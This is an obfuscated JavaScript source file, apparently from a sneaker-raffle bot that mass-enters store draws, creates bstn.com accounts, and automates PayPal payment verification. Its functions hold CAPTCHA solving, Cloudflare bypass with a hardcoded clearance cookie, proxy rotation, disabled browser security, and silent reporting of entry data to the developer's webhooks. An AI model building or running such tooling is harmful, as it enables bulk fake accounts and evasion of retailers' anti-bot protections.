async function _0x346ec0(_0x2a61cb, _0x3ed2ba, _0x3f7933, _0x1ced71, _0x5ba3b3) {
    var _0x2617a9, _0x2df8a9 = {}, _0x1a9d54 = [], _0x5c552c = {}, _0x3dfe33 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x1ced71 && (_0x1ced71 = {});
    if (_0x3ed2ba != 'ver') {
        _0x757e32(_0x3f7933['name'] + '\x20Task\x20' + (_0x2a61cb + 0x1) + '\x20/\x20' + _0x1ced71['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x1ced71, _0x2a61cb), _0x1a9d54 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Size',
                    'value': '' + _0x1ced71[_0x2a61cb]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x582dcf
                }
            ]
        }], _0x5c552c = { 'embeds': _0x1a9d54 }, _0x2df8a9 = _0x3f7933['data'];
        _0x3ed2ba == 'exp' ? _0x2df8a9['data']['attributes']['email'] = '' + _0x1ced71[_0x2a61cb]['FirstName'] + _0x1ced71[_0x2a61cb]['LastName'] + _0x2cde8d['catchall'] : _0x2df8a9['data']['attributes']['email'] = '' + _0x1ced71[_0x2a61cb]['Email'];
        if (_0x1ced71[_0x2a61cb]['Size'] == 'RANDOM') {
        }
        _0x2df8a9['data']['attributes']['properties']['$first_name'] = '' + _0x1ced71[_0x2a61cb]['FirstName'], _0x2df8a9['data']['attributes']['properties']['$last_name'] = '' + _0x1ced71[_0x2a61cb]['LastName'], _0x2df8a9['data']['attributes']['properties']['$address1'] = _0x1ced71[_0x2a61cb]['Address1'] + '\x20' + _0x1ced71[_0x2a61cb]['Address2'] + '\x20' + _0x1ced71[_0x2a61cb]['HouseNumber'], _0x2df8a9['data']['attributes']['properties']['$zip'] = '' + _0x1ced71[_0x2a61cb]['Zip'], _0x2df8a9['data']['attributes']['properties']['$city'] = '' + _0x1ced71[_0x2a61cb]['City'], _0x2df8a9['data']['attributes']['properties']['$country'] = '' + _0x1ced71[_0x2a61cb]['Country'], _0x2df8a9['data']['attributes']['properties']['Size'] = '' + _0x1ced71[_0x2a61cb]['Size'], _0x2df8a9['data']['attributes']['properties']['$phone_number'] = '' + _0x1ced71[_0x2a61cb]['Phone'], _0x2df8a9['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x1ced71[_0x2a61cb]['Follower'];
    }
    if (_0x2cde8d['useRandomProxy'] = ![])
        var _0x2d74d6 = _0x5ba3b3[_0x2a61cb]['split'](':');
    else
        var _0x10cda9 = Math['round'](Math['random']() * (_0x5ba3b3['length'] - 0x1)), _0x2d74d6 = _0x5ba3b3[_0x10cda9]['split'](':');
    var _0x509434 = {
        'jar': _0x3c0aa5,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x3f7933['url'],
        'headers': _0x3f7933['headers'],
        'body': JSON['stringify'](_0x2df8a9),
        'proxy': 'http://' + _0x2d74d6[0x2] + ':' + _0x2d74d6[0x3] + '@' + _0x2d74d6[0x0] + ':' + _0x2d74d6[0x1]
    };
    return _0x3ed2ba != 'ver' && (_0x509434['url'] = _0x3f7933['url'], _0x509434['headers'] = _0x3f7933['headers']), _0x3ed2ba == 'ver' && (_0x509434['method'] = 'GET'), new Promise(function (_0x3c74ae, _0x3e8b3d) {
        callback = async (_0x437328, _0x3883e5, _0x40cdc1) => {
            if (!_0x437328 && _0x3883e5['statusCode'] == 0xca || !_0x437328 && _0x3883e5['statusCode'] == 0xc8) {
                if (_0x3ed2ba != 'ver') {
                    var _0x3cee6c = await _0x2463d6(_0x1ced71[_0x2a61cb], _0x3f7933, 'dev', ![]), _0x84d6df = await _0x2463d6(_0x1ced71[_0x2a61cb], _0x3f7933, 'pub', ![]);
                    const _0x11c580 = {
                        'succesDEVMSG': { 'embeds': [_0x3cee6c] },
                        'succesPUBMSG': { 'embeds': [_0x84d6df] }
                    };
                    if (_0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '')
                        try {
                            await _0x31fc49(_0x2cde8d['webhook'], _0x11c580['succesDEVMSG']);
                        } catch {
                        }
                    await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x11c580['succesDEVMSG']), await _0x29ac01(0xc8);
                    try {
                        await _0x31fc49(_0x5bae61, _0x11c580['succesPUBMSG']);
                    } catch {
                    }
                    _0x4cb72b(_0x1ced71[_0x2a61cb], _0x3f7933);
                }
                _0x3c74ae(console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x3f7933['name'] + ']\x20Task\x20' + (_0x2a61cb + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x3ed2ba != 'ver') {
                    var _0x1e2aa5 = '' + _0x437328, _0x16565a = await _0x2463d6(_0x1ced71[_0x2a61cb], _0x3f7933, 'dev', !![], _0x1e2aa5), _0x557dd8 = {};
                    _0x557dd8['errorDEV'] = { 'embeds': [_0x16565a] }, _0x29520a(_0x1ced71[_0x2a61cb], _0x3f7933), _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x557dd8['errorDEV']), await _0x31fc49(_0x344612, _0x557dd8['errorDEV']);
                }
                _0x3e8b3d(console['log'](_0x91a29b() + '\x20[' + _0x3f7933['name'] + ']\x20Task\x20' + (_0x2a61cb + 0x1) + ':\x20' + _0x437328));
            }
        };
        try {
            _0x3ed2ba != 'ver' && console['log'](_0x91a29b() + '\x20[' + _0x3f7933['name'] + ']\x20Task\x20' + (_0x2a61cb + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2df8a9['data']['attributes']['email']), _0x47e84e(_0x509434, callback);
        } catch (_0x392473) {
            console['log'](_0x91a29b() + '\x20Task\x20' + (_0x2a61cb + 0x1) + ':\x20' + _0x392473);
        }
    });
}
;
async function _0x182b7a(_0x285846, _0x157a4d, _0x1c45d2) {
    var _0x16a24b;
    _0x757e32('' + _0x157a4d);
    var _0x4e577a = _0x1c45d2[0x0]['split'](':');
    const _0x2b14e0 = await _0x149082['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x4e577a[0x0] + ':' + _0x4e577a[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x91a29b() + '\x20[' + _0x157a4d + ']\x20Getting\x20Session');
        const _0x4767f0 = JSON['parse'](_0x45be1e['readFileSync']('sessions/log.json')), _0x3e3b2 = await _0x2b14e0['newPage']();
        await _0x3e3b2['authenticate']({
            'username': '' + _0x4e577a[0x2],
            'password': '' + _0x4e577a[0x3]
        }), await _0x3e3b2['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3e3b2, await _0x3e3b2['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x91a29b() + '\x20[' + _0x157a4d + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3e3b2['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x91a29b() + '\x20[' + _0x157a4d + ']\x20Successfully\x20logged\x20in'), await _0x29ac01(0x2710), _0x16a24b = await _0x3e3b2['cookies'](), _0x45be1e['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x16a24b));
        } catch (_0x35cffb) {
            throw new Error('Login\x20session\x20expired\x20' + _0x35cffb);
        }
        for (var _0x549fc9 = 0x0; _0x549fc9 < _0x285846['length']; _0x549fc9++) {
            console['log'](_0x91a29b() + '\x20[' + _0x157a4d + ']\x20Task\x20' + (_0x549fc9 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x757e32(_0x157a4d + '\x20Task\x20' + (_0x549fc9 + 0x1) + '\x20/\x20' + _0x285846['length']);
            const _0x194237 = await _0x2b14e0['newPage']();
            await _0x194237['goto']('' + _0x285846[_0x549fc9], { 'waitUntil': 'networkidle2' }), await _0x29ac01(0xbb8);
            try {
                const _0x48084c = await _0x194237['$']('#challenge-heading');
                _0x48084c && (console['log'](_0x91a29b() + '\x20[' + _0x157a4d + ']\x20Task\x20' + (_0x549fc9 + 0x1) + '\x20:\x20' + _0x3e6680['yellow']('2FA\x20Required')), await _0x194237['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x29ac01(0x61a8), await _0x194237['waitForSelector']('#payment-submit-btn'), await _0x194237['$eval']('#payment-submit-btn', _0x14c4cf => _0x14c4cf['click']()), await _0x194237['click']('#payment-submit-btn');
                try {
                    await _0x194237['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x29ac01(0x5dc), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x157a4d + ']\x20Task\x20' + (_0x549fc9 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0xe58801) {
                    throw new Error('Payment\x20Rejected:\x20' + _0xe58801['message']);
                } finally {
                    await _0x194237['close'](), await _0x29ac01(0x4650);
                }
            } catch (_0x51acb2) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x157a4d + ']\x20Task\x20' + (_0x549fc9 + 0x1) + '\x20:\x20' + _0x51acb2));
            }
        }
    } catch (_0x404a5b) {
        console['log'](_0x3e6680['red']('' + _0x404a5b));
    } finally {
        await _0x2b14e0['close']();
    }
}
async function _0x2cf632(_0x663fc5, _0x75b913, _0x41db36) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x12fb06 = 0x0; _0x12fb06 < _0x663fc5['length']; _0x12fb06++) {
        if (_0x5f08db != 'yes')
            var _0x5f08db = '', _0x3703f9 = 0x0;
        var _0x456d21;
        await _0x43304e(_0x663fc5, _0x12fb06), _0x757e32(_0x41db36['name'] + '\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20/\x20' + _0x663fc5['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83);
        var _0xb398d = await _0x2463d6(_0x663fc5[_0x12fb06], _0x41db36, 'acc', ![]);
        const _0x159652 = { 'succesDEVMSG': { 'embeds': [_0xb398d] } }, _0x23c2a4 = 'https://www.bstn.com/eu_en/customer/account/create/';
        var _0x150861 = Math['round'](Math['random']() * (_0x75b913['length'] - 0x1)), _0x3b2bd3 = _0x75b913[_0x150861]['split'](':');
        const _0x14922e = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3b2bd3[0x0] + ':' + _0x3b2bd3[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x85d728 = await _0x14922e['newPage']();
            await _0x85d728['authenticate']({
                'username': '' + _0x3b2bd3[0x2],
                'password': '' + _0x3b2bd3[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x85d728['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x85d728['setRequestInterception'](!![]), _0x85d728['on']('request', _0xa51276 => {
                _0xa51276['resourceType']() === 'image' ? _0xa51276['abort']() : _0xa51276['continue']();
            }), await _0x85d728['goto']('' + _0x23c2a4), await _0x85d728['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x85d728['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x29ac01(0x7d0), console['log'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x29ac01(0x190), await _0x85d728['waitForSelector']('#firstname'), await _0x85d728['type']('#firstname', _0x663fc5[_0x12fb06]['FirstName'], { 'delay': 0xf0 }), await _0x29ac01(0x190), await _0x85d728['type']('#lastname', _0x663fc5[_0x12fb06]['LastName'], { 'delay': 0xe6 }), await _0x29ac01(0x190), await _0x85d728['type']('#email_address', _0x663fc5[_0x12fb06]['Email'], { 'delay': 0x122 }), await _0x29ac01(0x190), await _0x85d728['type']('#password', _0x663fc5[_0x12fb06]['Password'], { 'delay': 0x82 }), await _0x29ac01(0x1f4), await _0x85d728['type']('#password-confirmation', _0x663fc5[_0x12fb06]['Password'], { 'delay': 0x7c }), console['log'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x29ac01(0x2bc), await _0x85d728['$eval']('#form-validate', _0x329ee3 => _0x329ee3['submit']()), await _0x29ac01(0x1388);
            const _0x49ba1f = await _0x85d728['$']('#email_address-error');
            if (_0x49ba1f)
                throw new Error('Invalid\x20Email');
            const _0x3fb5ce = await _0x85d728['$']('#password-error');
            if (_0x3fb5ce)
                throw new Error('Invalid\x20Password');
            await _0x85d728['waitForSelector']('div.mesg-success'), _0x5f08db = 'no', console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20Account\x20' + _0x663fc5[_0x12fb06]['Email'] + '\x20Generated')), _0x45be1e['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x663fc5[_0x12fb06]['Email'] + ',' + _0x663fc5[_0x12fb06]['Password']);
            try {
                _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x159652['succesDEVMSG']);
            } catch {
            }
            await _0x31fc49(_0x201dd3, _0x159652['succesDEVMSG']), console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0xc21a44) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20' + _0xc21a44)), _0x456d21 = '' + _0xc21a44;
            var _0x1f49ec = await _0x2463d6(_0x663fc5[_0x12fb06], _0x41db36, 'acc', !![], _0x456d21);
            _0x159652['errorDEV'] = { 'embeds': [_0x1f49ec] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x159652['errorDEV']), await _0x31fc49(_0x344612, _0x159652['errorDEV']), _0x5f08db = 'yes';
        } finally {
            _0x14922e['close']();
            if (_0x5f08db == 'yes' && _0x3703f9 != 0x5) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Task\x20' + (_0x12fb06 + 0x1) + '\x20:\x20Retrying')), _0x12fb06 = _0x12fb06 - 0x1, _0x3703f9 = _0x3703f9 + 0x1;
                continue;
            }
            _0x5f08db == 'yes' && _0x3703f9 >= 0x5 && (_0x29520a(_0x663fc5[_0x12fb06], _0x41db36), _0x5f08db = 'no', _0x3703f9 = 0x0), console['log'](_0x91a29b() + '\x20[' + _0x41db36['name'] + ']\x20Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x4b72b5(_0x14576c, _0x565d72, _0x4948fe) {
    _0x149082['use'](_0x6d9f88());
    for (var _0x3aeb10 = 0x0; _0x3aeb10 < _0x14576c['length']; _0x3aeb10++) {
        if (_0xe26309 != 'yes')
            var _0xe26309 = '', _0x3da96d = 0x0;
        var _0x26e8a2 = Math['round'](Math['random']() * (_0x565d72['length'] - 0x1)), _0x1d179b = _0x565d72[_0x26e8a2]['split'](':');
        const _0x2cf365 = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1d179b[0x0] + ':' + _0x1d179b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1c4b2e = await _0x2cf365['newPage']();
            await _0x1c4b2e['authenticate']({
                'username': '' + _0x1d179b[0x2],
                'password': '' + _0x1d179b[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x4948fe['name'] + ']\x20Task\x20' + (_0x3aeb10 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x1c4b2e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1c4b2e['setRequestInterception'](!![]), _0x1c4b2e['on']('request', _0x42a328 => {
                _0x42a328['resourceType']() === 'image' || _0x42a328['resourceType']() === 'font' || _0x42a328['resourceType']() === 'media' ? _0x42a328['abort']() : _0x42a328['continue']();
            }), console['log'](_0x91a29b() + '\x20[' + _0x4948fe['name'] + ']\x20Task\x20' + (_0x3aeb10 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1c4b2e['goto'](_0x14576c[_0x3aeb10]), console['log'](_0x91a29b() + '\x20[' + _0x4948fe['name'] + ']\x20Task\x20' + (_0x3aeb10 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1c4b2e['waitForTimeout'](0xbb8);
            try {
                await _0x1c4b2e['waitForSelector']('.dashboard-main_title'), _0xe26309 = 'no', console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x4948fe['name'] + ']\x20Task\x20' + (_0x3aeb10 + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x26c02d = await _0x2463d6(null, _0x4948fe, 'ver', ![]);
                const _0x56b856 = { 'succesDEVMSG': { 'embeds': [_0x26c02d] } };
                await _0x31fc49(_0x4f1207, _0x56b856['succesDEVMSG']);
            } catch (_0x518b7c) {
                throw new Error(_0x518b7c);
            }
        } catch (_0x106d06) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x4948fe['name'] + ']\x20Task\x20' + (_0x3aeb10 + 0x1) + '\x20:\x20' + _0x106d06));
            var _0x235f45 = _0x106d06, _0x1d2592 = await _0x2463d6(null, _0x4948fe, 'ver', !![], _0x235f45);
            const _0x2b8c52 = { 'errorDEVMSG': { 'embeds': [_0x1d2592] } };
            _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x2b8c52['errorDEVMSG']), await _0x31fc49(_0x344612, _0x2b8c52['errorDEVMSG']), _0xe26309 = 'yes';
        } finally {
            _0x2cf365['close']();
            if (_0xe26309 == 'yes' && _0x3da96d != 0x5) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x4948fe['name'] + ']\x20Task\x20' + (_0x3aeb10 + 0x1) + '\x20:\x20Retrying')), _0x3aeb10 = _0x3aeb10 - 0x1, _0x3da96d = _0x3da96d + 0x1;
                continue;
            }
            _0xe26309 == 'yes' && _0x3da96d >= 0x5 && (_0x29520a(bstn[_0x3aeb10], _0x4948fe), _0xe26309 = 'no', _0x3da96d = 0x0), console['log'](_0x91a29b() + '\x20[' + _0x4948fe['name'] + ']\x20Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0xf61ce0(_0x4ce8ec, _0x35fcf4, _0x2289a8) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5c5161 = 0x0; _0x5c5161 < _0x4ce8ec['length']; _0x5c5161++) {
        var _0x591292;
        await _0x43304e(_0x4ce8ec, _0x5c5161);
        if (_0x282465 != 'yes')
            var _0x282465 = '', _0x242be2 = 0x0;
        _0x757e32(_0x2289a8['name'] + '\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20/\x20' + _0x4ce8ec['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83);
        var _0x19782b = Math['round'](Math['random']() * (_0x35fcf4['length'] - 0x1)), _0xdc21a3 = _0x35fcf4[_0x19782b]['split'](':'), _0x1da2c4;
        try {
            _0x1da2c4 = await _0x149082['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0xdc21a3[0x0] + ':' + _0xdc21a3[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x1da2c4 = await _0x149082['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0xdc21a3[0x0] + ':' + _0xdc21a3[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x57fe1a = await _0x1da2c4['newPage'](), _0x54a4f1 = await _0x57fe1a['target']()['createCDPSession'](), { windowId: _0x47bdc4 } = await _0x54a4f1['send']('Browser.getWindowForTarget');
            await _0x57fe1a['setViewport']({
                'width': 0x501,
                'height': 0x2d0
            });
            var _0x2c9fdc = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x57fe1a['authenticate']({
                'username': '' + _0xdc21a3[0x2],
                'password': '' + _0xdc21a3[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x57fe1a['goto']('' + _0x4ce8ec[_0x5c5161]['Url']), console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x57fe1a['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x54a4f1['send']('Browser.setWindowBounds', {
                'windowId': _0x47bdc4,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x29ac01(0x1388), await _0x57fe1a['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x57fe1a['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x29ac01(0x1f4), console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Logging\x20in'), await _0x57fe1a['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x582301 => _0x582301['click']()), await _0x57fe1a['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x57fe1a['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x29ac01(0x7d0), await _0x57fe1a['waitForSelector']('#email-login'), await _0x57fe1a['type']('#email-login', '' + _0x4ce8ec[_0x5c5161]['Email']), await _0x29ac01(0xdac), await _0x57fe1a['waitForSelector']('#password'), await _0x57fe1a['type']('#password', '' + _0x4ce8ec[_0x5c5161]['Password'], { 'delay': 0xe6 }), await _0x29ac01(0x5dc);
            try {
                await _0x57fe1a['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4151a4 => _0x4151a4['click']());
            } catch {
            }
            try {
                await _0x57fe1a['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x55c780) {
            }
            await _0x29ac01(0x3e8);
            const _0x23be0e = await _0x57fe1a['$']('.enteredDraw_container__2KmQ_');
            if (_0x23be0e)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4ce8ec[_0x5c5161]['Size']);
            if (_0x4ce8ec[_0x5c5161]['Size'] != 'RANDOM') {
                var _0x3527df = _0x4ce8ec[_0x5c5161]['Size']['replace']('.', ',');
                const _0x1e591b = await _0x57fe1a['$x']('//div[contains(text(),\x20' + _0x3527df + ')]');
                await _0x1e591b[0x0]['click']();
            } else {
                const _0x1cc337 = await _0x57fe1a['$$']('div.swatchTile_tile__IRH9Q');
                var _0x310c5c = Math['round'](Math['random']() * (_0x1cc337['length'] - 0x1));
                await _0x1cc337[_0x310c5c]['click']();
            }
            await _0x29ac01(0x1f4);
            const _0x22d5c5 = await _0x57fe1a['$']('.addressList_addressItem__LE2PB');
            if (_0x22d5c5 && _0x4ce8ec[_0x5c5161]['Mode'] != 'NEW') {
            } else
                console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x57fe1a['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x29ac01(0x5dc), await _0x57fe1a['waitForSelector']('#firstname'), await _0x57fe1a['type']('#firstname', '' + _0x4ce8ec[_0x5c5161]['FirstName']), await _0x29ac01(0x1f4), await _0x57fe1a['waitForSelector']('#firstname'), await _0x57fe1a['type']('#lastname', '' + _0x4ce8ec[_0x5c5161]['LastName']), await _0x29ac01(0x1f4), await _0x57fe1a['waitForSelector']('#firstname'), await _0x57fe1a['type']('#street', '' + _0x4ce8ec[_0x5c5161]['Address1']), await _0x29ac01(0x1f4), await _0x57fe1a['waitForSelector']('#firstname'), await _0x57fe1a['type']('#houseNumber', _0x4ce8ec[_0x5c5161]['HouseNumber'] + '\x20' + _0x4ce8ec[_0x5c5161]['Address2']), await _0x29ac01(0x1f4), await _0x57fe1a['waitForSelector']('#firstname'), await _0x57fe1a['select']('#country_code', '' + _0x4ce8ec[_0x5c5161]['Country']), await _0x29ac01(0x1f4), await _0x57fe1a['type']('#postcode', '' + _0x4ce8ec[_0x5c5161]['Zip']), await _0x29ac01(0x1f4), await _0x57fe1a['type']('#city', '' + _0x4ce8ec[_0x5c5161]['City']), await _0x29ac01(0x1f4), await _0x57fe1a['type']('#telephone', '' + _0x4ce8ec[_0x5c5161]['Phone']), await _0x29ac01(0x1f4), await _0x57fe1a['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x29ac01(0x9c4);
            try {
                await _0x57fe1a['type']('#instagram_name', '' + _0x4ce8ec[_0x5c5161]['Follower']), await _0x57fe1a['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x29ac01(0x5dc);
            try {
                await _0x57fe1a['click']('.checkBox_boxHolder__wLGVe');
            } catch {
            }
            await _0x29ac01(0x5dc), await _0x57fe1a['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3a5bf0 => _0x3a5bf0['click']()), await _0x29ac01(0x1388);
            try {
                await _0x57fe1a['waitForSelector']('.success_msg__2HjJY');
            } catch {
                await _0x57fe1a['reload']({ 'waitUntil': 'networkidle2' });
                if (_0x4ce8ec[_0x5c5161]['Size'] != 'RANDOM') {
                    var _0x3527df = _0x4ce8ec[_0x5c5161]['Size']['replace']('.', ',');
                    const _0x159fb6 = await _0x57fe1a['$x']('//div[contains(text(),\x20' + _0x3527df + ')]');
                    await _0x159fb6[0x0]['click']();
                } else {
                    const _0x57c362 = await _0x57fe1a['$$']('div.swatchTile_tile__IRH9Q');
                    var _0x310c5c = Math['round'](Math['random']() * (_0x57c362['length'] - 0x1));
                    await _0x57c362[_0x310c5c]['click']();
                }
                await _0x29ac01(0x5dc);
                try {
                    await _0x57fe1a['hover']('#instagram_name'), await _0x57fe1a['type']('#instagram_name', '' + _0x4ce8ec[_0x5c5161]['Follower']), await _0x57fe1a['click']('.note_groupBtn__WLDwH\x20>\x20button');
                } catch {
                }
                console['log'](_0x91a29b() + '\x20[' + _0x2289a8['name'] + ']\x20Task\x20' + (_0x5c5161 + 0x1) + '\x20:\x20Retrying'), await _0x57fe1a['hover']('.checkBox_boxHolder__wLGVe'), await _0x29ac01(0x5dc), await _0x57fe1a['click']('.checkBox_boxHolder__wLGVe'), await _0x29ac01(0x157c), await _0x57fe1a['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5ae3bb => _0x5ae3bb['click']()), await _0x29ac01(0x1388), await _0x57fe1a['waitForSelector']('.success_msg__2HjJY');
            }
